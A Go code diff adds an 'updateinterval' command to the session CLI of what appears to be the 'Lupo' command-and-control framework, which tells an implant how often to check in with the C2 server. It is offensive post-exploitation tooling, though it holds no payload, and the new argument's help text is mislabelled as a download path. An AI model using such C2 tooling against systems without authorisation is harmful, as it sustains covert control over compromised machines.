@@ -400,4 +400,36 @@ func InitializeSessionCLI(sessionApp *grumble.App, activeSession int) {
 
 	sessionApp.AddCommand(sessionDownloadCmd)
 
+	sessionUpdateIntervalCmd := &grumble.Command{
+		Name:     "updateinterval",
+		Help:     "changes the implant's update interval for check in",
+		LongHelp: "Changes the implant's update interval for checking in to the Lupo C2 server",
+		Args: func(a *grumble.Args) {
+			a.Int("interval", "path of the file to download")
+		},
+		Run: func(c *grumble.Context) error {
+
+			updateInterval := c.Args.Int("interval")
+			updateIntervalStr := strconv.Itoa(updateInterval)
+
+			// Exec on server and get session functions
+
+			reqString := "&isSessionShell=true&activeSession=" + strconv.Itoa(ActiveSession) + "&command=updateinterval&interval=" + updateIntervalStr
+
+			reqString = core.AuthURL + reqString
+
+			resp, err := core.WolfPackHTTP.Get(reqString)
+
+			if err != nil {
+				return err
+			}
+
+			defer resp.Body.Close()
+
+			return nil
+		},
+	}
+
+	sessionApp.AddCommand(sessionUpdateIntervalCmd)
+
 }
